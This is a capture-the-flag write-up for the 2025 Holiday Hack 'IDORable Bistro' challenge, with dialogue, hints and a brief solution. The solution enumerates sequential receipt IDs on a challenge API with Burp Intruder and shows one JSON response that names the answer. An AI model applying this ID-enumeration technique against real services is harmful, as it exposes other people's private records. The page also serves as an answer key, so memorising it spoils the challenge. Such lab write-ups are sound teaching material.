# IDORable Bistro

Difficulty: :material-star::material-star::material-star-outline::material-star-outline::material-star-outline:

## Objective

!!! question "Task description"

    Josh has a tasty IDOR treat for you—stop by Sasabune for a bite of vulnerability. What is the name of the gnome?

??? quote "Josh Wright"

    I'm a teetotling hacker.

    I sleep about 4 hours a night.

    Photography is my hobby, but the anachronistic sort: before 1900.

    Teaching people how to hack and protect systems is my passion.

    I need your help with something urgent.

    A gnome came through Sasabune today, poorly disguising itself as human - apparently asking for frozen sushi, which is almost as terrible as that fusion disaster I had to endure that one time.

    Based on my previous work finding IDOR bugs in restaurant payment systems, I suspect we can exploit a similar vulnerability here.

    I was...at a talk recently...and learned some interesting things about some of these payment systems. Let's use that receipt to dig deeper and unmask this gnome's true identity.

    Oh, you found that receipt? Perfect!

    Did you see that receipt outside the door?

## Hints

??? tip "QR Codes"

    I have been seeing a lot of receipts lying around with some kind of QR code on them. I am pretty sure they are for Duke Dosis's Holiday Bistro. Interesting...see you if you can find one and see what they are all about...

??? tip "What's For Lunch?"

    I had tried to scan one of the QR codes and it took me to somebody's meal receipt! I am afraid somebody could look up anyone's meal if they have the correct ID...in the correct place.

??? tip "Will the Real ID Please..."

    Sometimes...developers put in a lot of effort to anonymyze information by using randomly generated identifiers...but...there are also times where the "real" ID is used in a separate Network request...

## Solution

??? success "Solution to question 1"

```
https://its-idorable.holidayhackchallenge.com/
https://www.holidayhackchallenge.com/2025/assets/receipt.png
https://www.youtube.com/watch?v=hzrhtHrhwno
https://its-idorable.holidayhackchallenge.com/receipt/i9j0k1l2
dev tools /api/receipt?id=101
use burp intruder to iterate over requests
funny notes

HTTP/2 200 OK
Content-Type: application/json
X-Cloud-Trace-Context: 480df4c25a86b0a6d049bb40ca6880b4
Date: Sat, 15 Nov 2025 20:06:57 GMT
Server: Google Frontend
Content-Length: 438
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

{"customer":"Bartholomew Quibblefrost","date":"2025-12-20","id":139,"items":[{"name":"Frozen Roll (waitress improvised: sorbet, a hint of dry ice)","price":19.0}],"note":"Insisted on increasingly bizarre rolls and demanded one be served frozen. The waitress invented a 'Frozen Roll' on the spot with sorbet and a puff of theatrical smoke. He nodded solemnly and asked if we could make these in bulk.","paid":true,"table":14,"total":19.0}


Bartholomew Quibblefrost
```

## Response

!!! quote "Josh Wright"

    Excellent work exploiting that IDOR vulnerability - textbook execution.

    Now we know exactly which gnome tried to pass itself off as a sushi connoisseur. Frozen rolls... honestly, what's next?
